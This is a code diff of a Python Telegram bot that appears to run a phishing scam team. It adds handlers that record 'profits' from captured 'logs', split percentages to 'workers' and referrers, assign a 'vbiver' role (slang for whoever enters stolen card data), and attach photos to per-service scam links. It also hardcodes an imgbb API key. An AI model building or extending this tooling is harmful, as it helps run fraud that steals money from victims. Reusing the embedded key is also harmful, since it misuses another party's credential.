+    data = await state.update_data(amount=message.text)
+    _log = Logs.find_log(data['log'])
+    if _log['admin_id'] == message.from_user.id:
+        link = Link.find_link(_log['link_id'])
+        user = User.find_user(link['user'])
+        admin_settings = Settings.get_settings()[0]
+        _service = Service.find_service(link['service']['id'])[0]
+        Profits.create_profit(_log, int(message.text)/100*admin_settings['percent_worker'], user['id'], message.from_user.id)
+        if user['first_profit']:
+            User.change_first_profit(user['id'], False)
+            print(user['ref'])
+            if user['ref'] != 0:
+                ref = User.find_user(user['ref'])
+                amount = int(message.text)*0.03
+                await bot.send_message(
+                    chat_id=ref['id'],
+                    text=admin_texts.ref_profit(amount)
+                )
+        await bot.send_message(
+            chat_id=ADMIN_PROFITS_ID,
+            text=admin_texts.profit_service(message.text, _service, user)
+        )
+        await bot.send_message(
+            chat_id=user['id'],
+            text=admin_texts.profit(message.text)
+        )
+        Logs.change_status(data['log'], 'success')
+
+        await state.clear()
+        await bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=data['message'],
+            text=log.success_log
+        )
+@dp.callback_query(F.data.startswith('cn_u_sts_'))
+async def cn_u_sts(callback: types.CallbackQuery):
+    data = callback.data.split('_')
+    if data[4] == 'admin':
+        User.change_admin(data[3])
+        await bot.send_message(
+            text=admin_texts.success_change_admin,
+            chat_id=data[3],
+            reply_markup=AdminInKeyboards.inline_success_admin
+        )
+    if data[4] == "vbiver":
+        User.change_status(data[3], "vbiver")
+        await bot.send_message(
+            text=admin_texts.success_change_vbiver,
+            chat_id=data[3],
+            reply_markup=AdminInKeyboards.inline_success_vbiver
+        )
+    else:
+        User.change_status(data[3], data[4])
+
+    await callback.message.edit_caption(
+        caption=admin_texts.success_change_status_user,
+        reply_markup=AdminInKeyboards.menu
+    )
+
+@dp.callback_query(F.data.startswith('status*_'))
+async def status(callback: types.CallbackQuery):
+    data = callback.data.split('_')[1]
+    await callback.message.edit_caption(
+        caption=texts.change_status,
+        reply_markup=AdminInKeyboards.user_statuses(data)
+    )
 
 @dp.callback_query(F.data.startswith("create_link_country_"))
 async def create_link_country(callback: types.CallbackQuery):
@@ -763,11 +1125,39 @@ async def create_link_author(message: types.Message, state:FSMContext):
         await state.set_state(CreateLink.photo)
         await bot.delete_message(message_id=message.message_id, chat_id=message.chat.id)
     else:
-        data = await state.update_data(photo=message.photo[-1])
         photo = message.photo[-1]
-        photo_file = await photo.download()
-        print(photo_file)
-        print(data['photo'])
+
+        # Получаем информацию о фото
+        file_info = await bot.get_file(photo.file_id)
+        file_path = file_info.file_path
+
+        # Скачиваем фото
+        file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_path}'
+        with requests.get(file_url) as response:
+            if response.status_code == 200:
+                # Отправляем фото на ibb.co
+                upload_url = 'https://api.imgbb.com/1/upload'
+                files = {'image': ('photo.jpg', response.content)}
+                params = {'key': 'd4ab977249fa6c85efeeba786f2132fe'}  # Замените на ваш API-ключ от ibb.co
+
+                ibb_response = requests.post(upload_url, files=files, params=params)
+                print(ibb_response.json)
+                if ibb_response.status_code == 200:
+                    ibb_data = ibb_response.json()
+                    ibb_url = ibb_data['data']['url']
+                    await state.update_data(photo=ibb_url)
+                    await state.set_state(CreateLink.number)
+                    await bot.edit_message_caption(
+                        chat_id=message.chat.id,
+                        message_id=data['message'],
+                        caption=texts.link_number,
+                        reply_markup=InKeyboards.cancel
+                    )
+                    await message.delete()
+                else:
+                    print("Произошла ошибка при загрузке фото на ibb.co.")
+            else:
+                print("Произошла ошибка при скачивании фото.")
 
 @dp.callback_query(F.data == "skip_photo_create_link")
 async def skip_photo_create_link(callback: types.CallbackQuery, state:FSMContext):
@@ -856,6 +1246,91 @@ async def link_delete(callback: types.CallbackQuery, state: FSMContext):
         caption=texts.delete_link(link['name']),
         reply_markup=InKeyboards.delete_link(link['id'])
     )
+
+@dp.callback_query(F.data.startswith('image_log_'))
+async def image_log(callback: types.CallbackQuery,state: FSMContext):
+    data = callback.data.split('_')[2]
+    print(data)
+    _log = Logs.find_log(data)
+    await state.set_state(CustomImage.log)
+    await state.update_data(log=data)
+    await state.update_data(message=callback.message.message_id)
+    await state.set_state(CustomImage.image)
+    await callback.message.edit_text(
+        text=log.wait_photo,
+        reply_markup=AdminInKeyboards.back(f'log_{_log["id"]}')
+    )
+
+@Bot_router.message(CustomImage.image)
+async def custom_photo(message: types.Message, state: FSMContext):
+    data = await state.update_data(text=message.text)
+    _log_old = Logs.find_log(data['log'])
+    if  _log_old['admin_id'] != message.from_user.id:
+        return
+    if message.photo is not None:
+        photo = message.photo[-1]
+
+        # Получаем информацию о фото
+        file_info = await bot.get_file(photo.file_id)
+        file_path = file_info.file_path
+
+        # Скачиваем фото
+        file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_path}'
+        with requests.get(file_url) as response:
+            if response.status_code == 200:
+                # Отправляем фото на ibb.co
+                upload_url = 'https://api.imgbb.com/1/upload'
+                files = {'image': ('photo.jpg', response.content)}
+                params = {'key': 'd4ab977249fa6c85efeeba786f2132fe'}  # Замените на ваш API-ключ от ibb.co
+
+                ibb_response = requests.post(upload_url, files=files, params=params)
+                print(ibb_response.json)
+                if ibb_response.status_code == 200:
+                    ibb_data = ibb_response.json()
+                    ibb_url = ibb_data['data']['url']
+                    Logs.change_custom_photo(data['log'], ibb_url)
+                    Logs.change_status(data['log'], 'custom_photo')
+                else:
+                    print("Произошла ошибка при загрузке фото на ibb.co.")
+            else:
+                print("Произошла ошибка при скачивании фото.")
+    _log_old = Logs.find_log(data['log'])
+    link = Link.find_link(_log_old['link_id'])
+    service = Service.find_service(link['service']['id'])[0]
+    worker = User.find_user(link['user'])
+    admin = User.find_user(_log_old['admin_id'])
+    await bot.edit_message_text(
+        chat_id=ADMIN_LOGGING_ID,
+        message_id=data['message'],
+        text=log.log_text(service, link, worker, _log_old),
+        reply_markup=AdminInKeyboards.log(_log_old, link, service, admin)
+    )
+    async def background_task():
+        while True:
+            _log = Logs.find_log(data['log'])
+            print(_log)
+            print('____________________')
+            if _log['status'] == 'wait':
+                print(_log['custom_photo'])
+                print('____________________')
+                if _log['custom_photo'] != _log_old['custom_photo']:
+                    _log = Logs.find_log(data['log'])
+                    link = Link.find_link(_log['link_id'])
+                    service = Service.find_service(link['service']['id'])[0]
+                    worker = User.find_user(link['user'])
+                    admin = User.find_user(_log['admin_id'])
+                    await bot.edit_message_text(
+                        chat_id=ADMIN_LOGGING_ID,
+                        message_id=data['message'],
+                        text=log.log_text(service, link, worker, _log),
+                        reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                    )
+                    break
+            await asyncio.sleep(1)
+            if _log['status'] == "success":
+                break
+    asyncio.ensure_future(background_task())
+    await state.clear()
 
 @dp.callback_query(F.data.startswith("delete_link_confirm_"))
 async def delete_link(callback: types.CallbackQuery):
@@ -1136,7 +1611,8 @@ async def me(message: types.Message):
             user['hide'],
             user['supportChat'],
             sum(item['amount'] for item in profits),
-            len(profits), True),
+
+            len(profits), True, admin_texts.status(user['status'])),
         parse_mode="MARKDOWN"
     )
 
